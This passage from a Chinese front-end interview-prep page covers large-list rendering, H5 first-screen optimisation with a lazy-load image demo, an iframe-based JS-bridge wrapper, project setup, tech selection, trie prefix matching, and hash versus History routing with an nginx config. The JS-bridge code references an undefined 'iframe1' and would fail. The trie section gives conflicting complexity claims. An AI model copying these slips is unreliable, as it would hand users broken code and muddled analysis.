<ul><li>渲染到<code>DOM</code>上会非常卡顿</li></ul></li> <li><strong>方案1：自定义中间层</strong> <ul><li>自定义<code>nodejs</code>中间层，获取并拆分这十万条数据</li> <li>前端对接<code>nodejs</code>中间层，而不是服务端</li> <li>成本比较高</li></ul></li> <li><strong>方案2：虚拟列表</strong> <ul><li>只创建可视区的<code>DOM</code>（比如前十条数据），其他区域不显示，根据数据条数计算每条数据的高度，用<code>div</code>撑起高度</li> <li>随着浏览器的滚动，创建和销毁<code>DOM</code></li> <li>虚拟列表实现起来非常复杂，工作中可使用第三方库（<code>vue-virtual-scroll-list</code>、<code>react-virtualiszed</code>）</li> <li>虚拟列表只是无奈的选择，实现复杂效果而效果不一定好（低配手机）</li></ul></li></ul> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/01/2f1725384591607d.png" loading="lazy" class="lazy"></p> <h3 id="h5页面如何进行首屏优化"><a href="#h5页面如何进行首屏优化" class="header-anchor">#</a> H5页面如何进行首屏优化</h3> <ul><li><strong>路由懒加载</strong> <ul><li>适用于单页面应用</li> <li>路由拆分，优先保证首页加载</li></ul></li> <li><strong>服务端渲染SSR</strong> <ul><li><code>SSR</code>渲染页面过程简单，性能好</li> <li>纯<code>H5</code>页面，<code>SSR</code>是性能优化的终极方案，但对服务器成本也高</li></ul></li> <li><strong>分页</strong> <ul><li>针对列表页，默认只展示第一页内容</li> <li>上划加载更多</li></ul></li> <li><strong>图片懒加载lazyLoad</strong> <ul><li>针对详情页，默认只展示文本内容，然后触发图片懒加载</li> <li>注意：提前设置图片尺寸，尽量只重绘不重排</li></ul></li> <li><strong>Hybrid</strong> <ul><li>提前将<code>HTML JS CSS</code>下载到<code>App</code>内部，省去我们从网上下载静态资源的时间</li> <li>在<code>App webview</code>中使用<code>file://</code>协议加载页面文件</li> <li>再用<code>Ajax</code>获取内容并展示</li></ul></li> <li>性能优化要配合分析、统计、评分等，做了事情要有结果有说服力</li> <li>性能优化也要配合体验，如骨架屏、<code>loading</code>动画等</li></ul> <p><strong>图片懒加载演示</strong></p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css">
    <span class="token selector">.item-container</span> <span class="token punctuation">{</span>
      <span class="token property">border-top</span><span class="token punctuation">:</span> 1px solid #ccc<span class="token punctuation">;</span>
      <span class="token property">margin-bottom</span><span class="token punctuation">:</span> 30px<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token selector">.item-container img</span> <span class="token punctuation">{</span>
      <span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>
      <span class="token property">border</span><span class="token punctuation">:</span> 1px solid #eee<span class="token punctuation">;</span>
      <span class="token property">border-radius</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>
      <span class="token property">overflow</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>img lazy load<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>item-container<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>新闻标题<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>./img/loading.gif<span class="token punctuation">&quot;</span></span> <span class="token attr-name">data-src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>./img/animal1.jpeg<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>item-container<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>新闻标题<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>./img/loading.gif<span class="token punctuation">&quot;</span></span> <span class="token attr-name">data-src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>./img/animal2.webp<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>item-container<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>新闻标题<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>./img/loading.gif<span class="token punctuation">&quot;</span></span> <span class="token attr-name">data-src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>./img/animal3.jpeg<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>item-container<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>新闻标题<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>./img/loading.gif<span class="token punctuation">&quot;</span></span> <span class="token attr-name">data-src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>./img/animal4.webp<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>item-container<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>新闻标题<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>./img/loading.gif<span class="token punctuation">&quot;</span></span> <span class="token attr-name">data-src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>./img/animal5.webp<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>item-container<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>新闻标题<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>./img/loading.gif<span class="token punctuation">&quot;</span></span> <span class="token attr-name">data-src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>./img/animal6.webp<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>https://cdn.bootcdn.net/ajax/libs/lodash.js/4.17.21/lodash.min.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
      <span class="token keyword">function</span> <span class="token function">mapImagesAndTryLoad</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> images <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">'img[data-src]'</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>images<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span>

        images<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">img</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">const</span> rect <span class="token operator">=</span> img<span class="token punctuation">.</span><span class="token function">getBoundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>rect<span class="token punctuation">.</span>top <span class="token operator">&lt;</span> window<span class="token punctuation">.</span>innerHeight<span class="token punctuation">)</span> <span class="token punctuation">{</span>
              <span class="token comment">// 漏出来</span>
              <span class="token comment">// console.info('loading img', img.dataset.src)</span>
              img<span class="token punctuation">.</span>src <span class="token operator">=</span> img<span class="token punctuation">.</span>dataset<span class="token punctuation">.</span>src
              img<span class="token punctuation">.</span><span class="token function">removeAttribute</span><span class="token punctuation">(</span><span class="token string">'data-src'</span><span class="token punctuation">)</span> <span class="token comment">// 移除 data-src 属性，为了下次执行时减少计算成本</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
      <span class="token punctuation">}</span>

      window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'scroll'</span><span class="token punctuation">,</span> _<span class="token punctuation">.</span><span class="token function">throttle</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token function">mapImagesAndTryLoad</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

      <span class="token function">mapImagesAndTryLoad</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><h3 id="请描述js-bridge的实现原理"><a href="#请描述js-bridge的实现原理" class="header-anchor">#</a> 请描述js-bridge的实现原理</h3> <p><strong>什么是JS Bridge</strong></p> <ul><li><code>JS</code>无法直接调用<code>native API</code></li> <li>需要通过一些特定的格式来调用</li> <li>这些格式就统称<code>js-bridge</code>，例如微信<code>JSSKD</code></li></ul> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/01/0e45cf3988121684.png" loading="lazy" class="lazy"> <img alt="" data-src="https://s.poetries.work/uploads/2023/01/e68963dec49dbe97.png" loading="lazy" class="lazy"></p> <p><strong>JS Bridge的常见实现方式</strong></p> <ul><li>注册全局<code>API</code></li> <li><code>URL Scheme</code>（推荐）</li></ul> <div class="language-html extra-class"><pre class="language-html"><code><span class="token comment">&lt;!-- &lt;iframe id=&quot;iframe1&quot;&gt;&lt;/iframe&gt; --&gt;</span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
  <span class="token comment">// const version = window.getVersion() // 异步</span>

  <span class="token comment">// const iframe1 = document.getElementById('iframe1')</span>
  <span class="token comment">// iframe1.onload = () =&gt; {</span>
  <span class="token comment">//     const content = iframe1.contentWindow.document.body.innerHTML</span>
  <span class="token comment">//     console.info('content', content)</span>
  <span class="token comment">// }</span>
  <span class="token comment">// iframe1.src = 'my-app-name://api/getVersion' // app识别协议my-app-name://，在app内处理返回给webview，而不是直接发送网络请求</span>
  <span class="token comment">// URL scheme</span>

  <span class="token comment">// 使用iframe 封装 JS-bridge</span>
  <span class="token keyword">const</span> sdk <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token function">invoke</span><span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> onSuccess<span class="token punctuation">,</span> onError</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">const</span> iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span>
      iframe<span class="token punctuation">.</span>style<span class="token punctuation">.</span>visibility <span class="token operator">=</span> <span class="token string">'hidden'</span> <span class="token comment">// 隐藏iframe</span>
      document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span>
      iframe<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> content <span class="token operator">=</span> iframe1<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML
        <span class="token function">onSuccess</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span>
        iframe<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
      <span class="token punctuation">}</span>
      iframe<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token function">onError</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        iframe<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
      <span class="token punctuation">}</span>
      iframe<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">my-app-name://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>url<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">?data=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token function">fn1</span><span class="token punctuation">(</span><span class="token parameter">data<span class="token punctuation">,</span> onSuccess<span class="token punctuation">,</span> onError</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token string">'api/fn1'</span><span class="token punctuation">,</span> data<span class="token punctuation">,</span> onSuccess<span class="token punctuation">,</span> onError<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token function">fn2</span><span class="token punctuation">(</span><span class="token parameter">data<span class="token punctuation">,</span> onSuccess<span class="token punctuation">,</span> onError</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token string">'api/fn2'</span><span class="token punctuation">,</span> data<span class="token punctuation">,</span> onSuccess<span class="token punctuation">,</span> onError<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token function">fn3</span><span class="token punctuation">(</span><span class="token parameter">data<span class="token punctuation">,</span> onSuccess<span class="token punctuation">,</span> onError</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token string">'api/fn3'</span><span class="token punctuation">,</span> data<span class="token punctuation">,</span> onSuccess<span class="token punctuation">,</span> onError<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><h3 id="从零搭建开发环境需要考虑什么"><a href="#从零搭建开发环境需要考虑什么" class="header-anchor">#</a> 从零搭建开发环境需要考虑什么</h3> <ul><li>代码仓库，发布到哪个<code>npm</code>仓库（如有需要）</li> <li>技术选型，<code>Vue</code>或<code>React</code></li> <li>代码目录规范</li> <li>打包构建<code>webpack</code>等，做打包优化</li> <li><code>eslint</code>、<code>prettier</code>、<code>commit-lint</code></li> <li><code>pre-commit</code> 提交前检查（在调用<code>git commit</code> 命令时自动执行某些脚本检测代码,若检测出错,则阻止<code>commit</code>代码,也就无法<code>push</code>）</li> <li>单元测试</li> <li><code>CI/CD</code>流程（如搭建<code>jenkins</code>部署项目）</li> <li>开发环境、预发布环境</li> <li>编写开发文档</li></ul> <h3 id="如果你是项目前端技术负责人-将如何做技术选型"><a href="#如果你是项目前端技术负责人-将如何做技术选型" class="header-anchor">#</a> 如果你是项目前端技术负责人，将如何做技术选型</h3> <ul><li><strong>技术选型，选什么？</strong> <ul><li>前端框架（<code>Vue React Nuxt.hs Next.js</code> 或者<code>nodejs</code>框架）</li> <li>语言（<code>JavaScript</code>或<code>Typescript</code>）</li> <li>其他（构建工具、<code>CI/CD</code>等）</li></ul></li> <li><strong>技术选型的依据</strong> <ul><li>社区是否足够成熟</li> <li>公司已经有了经验积累</li> <li>团队成员的学习成本</li> <li>要站在公司角度，而非个人角度</li></ul></li> <li><strong>要全面考虑各种成本</strong> <ul><li>学习成本</li> <li>管理成本（如用<code>TS</code>遍地都是<code>any</code>怎么办）</li> <li>运维成本（如用<code>ssr</code>技术）</li></ul></li></ul> <h3 id="高效的字符串前缀匹配如何做"><a href="#高效的字符串前缀匹配如何做" class="header-anchor">#</a> 高效的字符串前缀匹配如何做</h3> <ul><li>有一个英文单词库（数组），里面有几十个英文单词</li> <li>输入一个字符串，快速判断是不是某一个单词的前缀</li> <li>说明思路，不用写代码</li></ul> <p><strong>思路分析</strong></p> <ul><li>常规思路
<ul><li>遍历单词库数组</li> <li><code>indexOf</code>判断前缀</li> <li>实际复杂度超过了<code>O(n)</code>，因为每一步遍历要考虑<code>indexOf</code>的计算量</li></ul></li> <li>优化
<ul><li>英文字母一共<code>26</code>个，可以提前把单词库数组拆分为<code>26</code>个</li> <li>第一层拆分为<code>26</code>个，第二第三层也可以继续拆分</li> <li>最后把单词库拆分为一颗树</li> <li>如<code>array</code>拆分为<code>{a:{r:{r:{a:{y:{}}}}}}</code> 查询的时候这样查<code>obj.a.r.r.a.y</code> 时间复杂度就是<code>O(1)</code></li> <li>转为为树的过程我们不用管，单词库更新频率一般都是很低的，我们执行一次提前转换好，通过哈希表（对象）查询<code>key</code>非常快</li></ul></li> <li>性能分析
<ul><li>如遍历数组，时间复杂度至少<code>O(n)</code>起步（<code>n</code>是数组长度）</li> <li>改为树，时间复杂度从大于<code>O(n)</code>降低到<code>O(m)</code>（<code>m</code>是单词的长度）</li> <li>哈希表（对象）通过<code>key</code>查询，时间复杂度是<code>O(1)</code></li></ul></li></ul> <h3 id="前端路由原理"><a href="#前端路由原理" class="header-anchor">#</a> 前端路由原理</h3> <p><strong>hash的特点</strong></p> <ul><li><code>hash</code>变化会触发网页跳转，即浏览器的前进和后退</li> <li><code>hash</code>变化不会刷新页面，<code>SPA</code>必须的特点</li> <li><code>hash</code>永远不会提交到<code>server</code>端</li> <li>通过<code>onhashchange</code>监听</li></ul> <p><strong>H5 History</strong></p> <ul><li>用<code>url</code>规范的路由，但跳转时不刷新页面</li> <li>通过<code>history.pushState</code>和<code>history.onpopstate</code>监听</li> <li><code>H5 History</code>需要后端支持
<ul><li>当我们进入到子路由时刷新页面，<code>web</code>容器没有相对应的页面此时会出现<code>404</code></li> <li>所以我们只需要配置将任意页面都重定向到 <code>index.html</code>，把路由交由前端处理</li> <li>对<code>nginx</code>配置文件<code>.conf</code>修改，添加<code>try_files $uri $uri/ /index.html;</code></li></ul> <div class="language-nginx extra-class"><pre class="language-nginx"><code><span class="token directive"><span class="token keyword">server</span></span> <span class="token punctuation">{</span>
  <span class="token directive"><span class="token keyword">listen</span>  <span class="token number">80</span></span><span class="token punctuation">;</span>
  <span class="token directive"><span class="token keyword">server_name</span>  www.xxx.com</span><span class="token punctuation">;</span>

  <span class="token directive"><span class="token keyword">location</span> /</span> <span class="token punctuation">{</span>
    <span class="token directive"><span class="token keyword">index</span>  /data/dist/index.html</span><span class="token punctuation">;</span>
    <span class="token directive"><span class="token keyword">try_files</span> <span class="token variable">$uri</span> <span class="token variable">$uri</span>/ /index.html</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div></li></ul> <p><strong>两者选择</strong></p> <ul><li><code>to B</code>系统推荐使用hash，简单易用，对<code>url</code>规范不敏感</li> <li><code>to C</code>系统，可以考虑使用<code>H5 History</code>，但需要服务端支持</li> <li>能选择简单的，就别用复杂的，要考虑成本和收益</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// hash 变化，包括：</span>
<span class="token comment">// a. JS 修改 url</span>
<span class="token comment">// b. 手动修改 url 的 hash</span>
<span class="token comment">// c. 浏览器前进、后退</span>
window<span class="token punctuation">.</span><span class="token function-variable function">onhashchange</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'old url'</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>oldURL<span class="token punctuation">)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'new url'</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>newURL<span class="token punctuation">)</span>

    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'hash:'</span><span class="token punctuation">,</span> location<span class="token punctuation">.</span>hash<span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token comment">// 页面初次加载，获取 hash</span>
document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'DOMContentLoaded'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'hash:'</span><span class="token punctuation">,</span> location<span class="token punctuation">.</span>hash<span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token comment">// JS 修改 url</span>
document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'btn1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">'#/user'</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// history API</span>

<span class="token comment">// 页面初次加载，获取 path</span>
document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'DOMContentLoaded'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> location<span class="token punctuation">.</span>pathname<span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token comment">// 打开一个新的路由</span>
<span class="token comment">// 【注意】用 pushState 方式，浏览器不会刷新页面</span>
document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'btn1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> state <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'page1'</span> <span class="token punctuation">}</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'切换路由到'</span><span class="token punctuation">,</span> <span class="token string">'page1'</span><span class="token punctuation">)</span>
    history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span>state<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'page1'</span><span class="token punctuation">)</span> <span class="token comment">// 重要！！</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token comment">// 监听浏览器前进、后退</span>
window<span class="token punctuation">.</span><span class="token function-variable function">onpopstate</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span> <span class="token comment">// 重要！！</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'onpopstate'</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>state<span class="token punctuation">,</span> location<span class="token punctuation">.</span>pathname<span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token comment">// 需要 server 端配合，可参考</span>
<span class="token comment">// https://router.vuejs.org/zh/guide/essentials/history-mode.html#%E5%90%8E%E7%AB%AF%E9%85%8D%E7%BD%AE%E4%BE%8B%E5%AD%90</span>
